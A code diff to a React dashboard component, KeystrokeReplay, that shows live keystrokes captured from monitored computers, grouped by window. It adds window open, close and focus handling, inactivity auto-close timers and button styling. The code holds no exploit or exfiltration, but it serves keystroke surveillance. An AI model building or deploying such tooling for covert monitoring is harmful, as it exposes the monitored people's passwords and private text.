@@ -86,6 +86,13 @@ function KeystrokeReplay() {
   // Key: "process|window_title", Value: { text, process, window, lastActivity, computerName }
   const [liveWindows, setLiveWindows] = useState({});
 
+  // Auto-close inactive windows after this many seconds (only for windows without recent activity)
+  // Windows will also close immediately when the monitored device closes them
+  const INACTIVE_WINDOW_TIMEOUT = 60; // 60 seconds of no activity
+
+  // Tick state to force re-render for countdown timers
+  const [, setTick] = useState(0);
+
   // Refs
   const playbackRef = useRef(null);
   const audioContextRef = useRef(null);
@@ -177,6 +184,7 @@ function KeystrokeReplay() {
             window: windowTitle,
             computerName: computerName,
             lastActivity: Date.now(),
+            isOpen: true,
           };
 
           let newText = existing.text;
@@ -216,9 +224,61 @@ function KeystrokeReplay() {
               ...existing,
               text: newText,
               lastActivity: Date.now(),
+              isOpen: true,
             },
           };
         });
+      });
+
+      // Handle live window events (open/close/focus)
+      socketRef.current.on("live_window", (event) => {
+        // Filter by selected computer if any
+        if (selectedComputer && event.computer_id !== selectedComputer) return;
+
+        const windowTitle = event.data?.window_title || "Unknown Window";
+        const processName = event.data?.process_name || "unknown";
+        const computerName = event.computer_name || "Unknown";
+        const windowKey = `${processName}|${windowTitle}`;
+
+        if (event.event_type === "window_opened") {
+          // Add new window panel
+          setLiveWindows((prev) => ({
+            ...prev,
+            [windowKey]: {
+              text: prev[windowKey]?.text || "",
+              process: processName,
+              window: windowTitle,
+              computerName: computerName,
+              lastActivity: Date.now(),
+              isOpen: true,
+            },
+          }));
+          console.log(`Window opened: ${processName} - ${windowTitle}`);
+        } else if (event.event_type === "window_closed") {
+          // Remove the window panel immediately
+          setLiveWindows((prev) => {
+            const newWindows = { ...prev };
+            delete newWindows[windowKey];
+            return newWindows;
+          });
+          console.log(`Window closed: ${processName} - ${windowTitle}`);
+        } else if (event.event_type === "window_focused") {
+          // Update the window's activity time to bring it to front
+          setLiveWindows((prev) => {
+            if (prev[windowKey]) {
+              return {
+                ...prev,
+                [windowKey]: {
+                  ...prev[windowKey],
+                  lastActivity: Date.now(),
+                },
+              };
+            }
+            return prev;
+          });
+          setCurrentWindow(windowTitle);
+          setCurrentProcess(processName);
+        }
       });
 
       // Also handle batched keystroke events (fallback for history)
@@ -312,6 +372,43 @@ function KeystrokeReplay() {
     if (count <= 6) return "grid-cols-3";
     return "grid-cols-3";
   };
+
+  // Auto-cleanup: Remove inactive windows after timeout + update countdown timers
+  useEffect(() => {
+    if (!isLiveMode) return;
+
+    const cleanupInterval = setInterval(() => {
+      const now = Date.now();
+
+      // Force re-render to update countdown timers
+      setTick((t) => t + 1);
+
+      setLiveWindows((prev) => {
+        const activeWindows = {};
+        let hasChanges = false;
+
+        for (const [key, windowData] of Object.entries(prev)) {
+          const inactiveSeconds = (now - windowData.lastActivity) / 1000;
+
+          if (inactiveSeconds < INACTIVE_WINDOW_TIMEOUT) {
+            activeWindows[key] = windowData;
+          } else {
+            hasChanges = true;
+            console.log(
+              `Auto-closing inactive window: ${
+                windowData.window
+              } (inactive for ${Math.round(inactiveSeconds)}s)`
+            );
+          }
+        }
+
+        // Only return new object if there were changes
+        return hasChanges ? activeWindows : prev;
+      });
+    }, 1000); // Check every second for smooth countdown
+
+    return () => clearInterval(cleanupInterval);
+  }, [isLiveMode]);
 
   // Load keystroke events
   const loadEvents = useCallback(async () => {
@@ -750,14 +847,21 @@ function KeystrokeReplay() {
                                   : "border-[#30363d] bg-[#21262d]"
                               }`}
                             >
-                              <div className="flex gap-1.5">
+                              <div className="flex gap-1.5 items-center group/dots">
                                 <button
-                                  onClick={() => closeWindowPanel(windowKey)}
-                                  className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400 transition-colors"
+                                  onClick={(e) => {
+                                    e.preventDefault();
+                                    e.stopPropagation();
+                                    closeWindowPanel(windowKey);
+                                  }}
+                                  className="w-3 h-3 rounded-full bg-red-500 hover:bg-red-400 transition-all cursor-pointer flex items-center justify-center"
                                   title="Close panel"
-                                />
-                                <div className="w-3 h-3 rounded-full bg-yellow-500" />
-                                <div className="w-3 h-3 rounded-full bg-green-500" />
+                                  type="button"
+                                >
+                                  <X className="w-2 h-2 text-red-900 opacity-0 group-hover/dots:opacity-100 transition-opacity" />
+                                </button>
+                                <div className="w-3 h-3 rounded-full bg-yellow-500 opacity-50" />
+                                <div className="w-3 h-3 rounded-full bg-green-500 opacity-50" />
                               </div>
                               <WindowIcon
                                 className={`w-4 h-4 ml-2 ${
@@ -799,7 +903,27 @@ function KeystrokeReplay() {
                             <div className="px-3 py-1.5 border-t border-[#30363d] bg-[#0d1117]/50">
                               <div className="flex items-center justify-between text-xs text-gray-500">
                                 <span>{windowData.process}</span>
-                                <span>{windowData.computerName}</span>
+                                <span className="flex items-center gap-2">
+                                  {!isActive && (
+                                    <span
+                                      className="text-gray-600"
+                                      title="Auto-closes after inactivity"
+                                    >
+                                      ⏱️{" "}
+                                      {Math.max(
+                                        0,
+                                        Math.round(
+                                          INACTIVE_WINDOW_TIMEOUT -
+                                            (Date.now() -
+                                              windowData.lastActivity) /
+                                              1000
+                                        )
+                                      )}
+                                      s
+                                    </span>
+                                  )}
+                                  <span>{windowData.computerName}</span>
+                                </span>
                               </div>
                             </div>
                           </div>
